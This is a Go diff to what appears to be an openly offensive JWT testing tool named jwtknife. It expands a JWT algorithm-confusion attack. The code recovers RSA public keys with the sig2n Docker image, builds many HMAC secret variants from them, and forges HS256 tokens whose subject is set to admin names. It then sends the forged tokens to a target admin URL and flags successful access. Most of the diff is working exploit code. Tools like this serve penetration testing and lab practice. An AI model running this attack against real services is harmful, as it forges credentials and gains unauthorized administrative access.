@@ -4,12 +4,15 @@ import (
 	"bytes"
 	"crypto/hmac"
 	"crypto/sha256"
+	"crypto/x509"
 	"encoding/base64"
+	"encoding/pem"
 	"os/exec"
 	"regexp"
 	"strconv"
 	"strings"
 
+	"github.com/spencer5cent/jwtknife/internal/dockerutil"
 	"github.com/spencer5cent/jwtknife/internal/httpx"
 	"github.com/spencer5cent/jwtknife/internal/jwtknifejwt"
 	"github.com/spencer5cent/jwtknife/internal/report"
@@ -47,6 +50,14 @@ func (AlgConfusionSig2NAttack) Run(in AttackInput) report.AttackResult {
 	}
 
 	// Execute external sig2n tooling (Docker-based).
+	cleanupDocker, err := dockerutil.EnsureAvailable()
+	if err != nil {
+		ar.Outcome = report.OutcomeError
+		ar.Errors = append(ar.Errors, "docker unavailable for sig2n: "+err.Error())
+		return ar
+	}
+	defer cleanupDocker()
+
 	cmd := exec.Command(
 		"docker", "run", "--rm", "portswigger/sig2n",
 		in.RawJWT,
@@ -80,81 +91,77 @@ func (AlgConfusionSig2NAttack) Run(in AttackInput) report.AttackResult {
 	adminSubjects := []string{"administrator", "admin", "root", "superuser", "carlos"}
 
 	for i, kB64 := range keys {
-		// sig2n typically outputs base64 of DER (X.509 / SubjectPublicKeyInfo)
-		keyDER, err := base64.StdEncoding.DecodeString(kB64)
-		if err != nil {
-			// Some outputs are base64url or include whitespace; try url variant too.
-			if b2, err2 := base64.RawURLEncoding.DecodeString(kB64); err2 == nil {
-				keyDER = b2
-			} else {
-				continue
-			}
+		keyVariants := candidateHMACSecrets(kB64)
+		if len(keyVariants) == 0 {
+			continue
 		}
 
-		for _, subject := range adminSubjects {
-			p, err := jwtknifejwt.Parse(in.RawJWT)
-			if err != nil {
-				ar.Errors = append(ar.Errors, "failed to parse original JWT: "+err.Error())
-				continue
-			}
-
-			// Force HS256, escalate subject
-			if p.Header == nil {
-				p.Header = map[string]any{}
-			}
-			if p.Payload == nil {
-				p.Payload = map[string]any{}
-			}
-			p.Header["alg"] = "HS256"
-			p.Payload["sub"] = subject
-
-			rebuilt, err := jwtknifejwt.Rebuild(p)
-			if err != nil {
-				ar.Errors = append(ar.Errors, "failed to rebuild JWT: "+err.Error())
-				continue
-			}
-
-			parts := strings.SplitN(rebuilt, ".", 3)
-			if len(parts) < 2 {
-				ar.Errors = append(ar.Errors, "failed to rebuild unsigned token")
-				continue
-			}
-			unsigned := parts[0] + "." + parts[1]
-
-			h := hmac.New(sha256.New, keyDER)
-			h.Write([]byte(unsigned))
-			sig := base64.RawURLEncoding.EncodeToString(h.Sum(nil))
-			forged := unsigned + "." + sig
-
-			step := report.Step{
-				Label:   "alg-confusion-sig2n",
-				Details: "Attempt with recovered X.509 candidate #" + strconv.Itoa(i) + " (sub=" + subject + ")",
-				JWT:     report.JWTInfo{Token: forged},
-			}
-
-			if in.Client != nil && in.Targets.AdminURL != "" {
-				r := in.Client.Do(httpx.RequestPlan{
-					Label:     "admin-alg-confusion-sig2n",
-					URL:       in.Targets.AdminURL,
-					Method:    in.Targets.Method,
-					JWT:       forged,
-					Placement: in.Targets.Placement,
-				})
-				step.HTTP = report.FromHTTPResult(r)
-
-				if report.IsAdminSuccess(in.Baseline, step.HTTP) {
-					ar.Steps = append(ar.Steps, step)
-					ar.Outcome = report.OutcomeSuccess
-					ar.Note = "admin access via algorithm confusion with recovered RSA key (sig2n)"
-					return ar
+		for _, key := range keyVariants {
+			for _, subject := range adminSubjects {
+				p, err := jwtknifejwt.Parse(in.RawJWT)
+				if err != nil {
+					ar.Errors = append(ar.Errors, "failed to parse original JWT: "+err.Error())
+					continue
 				}
 
-				if report.IsInteresting(in.Baseline, step.HTTP) {
-					ar.Outcome = report.OutcomeInteresting
+				// Force HS256, escalate subject
+				if p.Header == nil {
+					p.Header = map[string]any{}
 				}
-			}
+				if p.Payload == nil {
+					p.Payload = map[string]any{}
+				}
+				p.Header["alg"] = "HS256"
+				p.Payload["sub"] = subject
 
-			ar.Steps = append(ar.Steps, step)
+				rebuilt, err := jwtknifejwt.Rebuild(p)
+				if err != nil {
+					ar.Errors = append(ar.Errors, "failed to rebuild JWT: "+err.Error())
+					continue
+				}
+
+				parts := strings.SplitN(rebuilt, ".", 3)
+				if len(parts) < 2 {
+					ar.Errors = append(ar.Errors, "failed to rebuild unsigned token")
+					continue
+				}
+				unsigned := parts[0] + "." + parts[1]
+
+				h := hmac.New(sha256.New, key)
+				h.Write([]byte(unsigned))
+				sig := base64.RawURLEncoding.EncodeToString(h.Sum(nil))
+				forged := unsigned + "." + sig
+
+				step := report.Step{
+					Label:   "alg-confusion-sig2n",
+					Details: "Attempt with recovered X.509 candidate #" + strconv.Itoa(i) + " (sub=" + subject + ")",
+					JWT:     report.JWTInfo{Token: forged},
+				}
+
+				if in.Client != nil && in.Targets.AdminURL != "" {
+					r := in.Client.Do(httpx.RequestPlan{
+						Label:     "admin-alg-confusion-sig2n",
+						URL:       in.Targets.AdminURL,
+						Method:    in.Targets.Method,
+						JWT:       forged,
+						Placement: in.Targets.Placement,
+					})
+					step.HTTP = report.FromHTTPResult(r)
+
+					if report.IsAdminSuccess(in.Baseline, step.HTTP) {
+						ar.Steps = append(ar.Steps, step)
+						ar.Outcome = report.OutcomeSuccess
+						ar.Note = "admin access via algorithm confusion with recovered RSA key (sig2n)"
+						return ar
+					}
+
+					if report.IsInteresting(in.Baseline, step.HTTP) {
+						ar.Outcome = report.OutcomeInteresting
+					}
+				}
+
+				ar.Steps = append(ar.Steps, step)
+			}
 		}
 	}
 
@@ -204,4 +211,58 @@ func extractX509Keys(out string) []string {
 	}
 
 	return keys
+}
+
+func candidateHMACSecrets(raw string) [][]byte {
+	decodeVariants := [][]byte{}
+	if b, err := base64.StdEncoding.DecodeString(raw); err == nil {
+		decodeVariants = append(decodeVariants, b)
+	}
+	if b, err := base64.RawURLEncoding.DecodeString(raw); err == nil {
+		decodeVariants = append(decodeVariants, b)
+	}
+
+	seen := map[string]bool{}
+	var out [][]byte
+	add := func(v []byte) {
+		if len(v) == 0 {
+			return
+		}
+		key := string(v)
+		if !seen[key] {
+			seen[key] = true
+			out = append(out, v)
+		}
+	}
+
+	for _, decoded := range decodeVariants {
+		add(decoded)
+		add([]byte(base64.StdEncoding.EncodeToString(decoded)))
+
+		if block, _ := pem.Decode(decoded); block != nil {
+			normalizedPEM := pem.EncodeToMemory(block)
+			add(normalizedPEM)
+			add([]byte(base64.StdEncoding.EncodeToString(normalizedPEM)))
+			add(block.Bytes)
+		}
+
+		if pub, err := x509.ParsePKIXPublicKey(decoded); err == nil {
+			if der, err := x509.MarshalPKIXPublicKey(pub); err == nil {
+				pemBytes := pem.EncodeToMemory(&pem.Block{Type: "PUBLIC KEY", Bytes: der})
+				add(der)
+				add(pemBytes)
+				add([]byte(base64.StdEncoding.EncodeToString(pemBytes)))
+			}
+		}
+
+		if pub, err := x509.ParsePKCS1PublicKey(decoded); err == nil {
+			der := x509.MarshalPKCS1PublicKey(pub)
+			pemBytes := pem.EncodeToMemory(&pem.Block{Type: "RSA PUBLIC KEY", Bytes: der})
+			add(der)
+			add(pemBytes)
+			add([]byte(base64.StdEncoding.EncodeToString(pemBytes)))
+		}
+	}
+
+	return out
 }
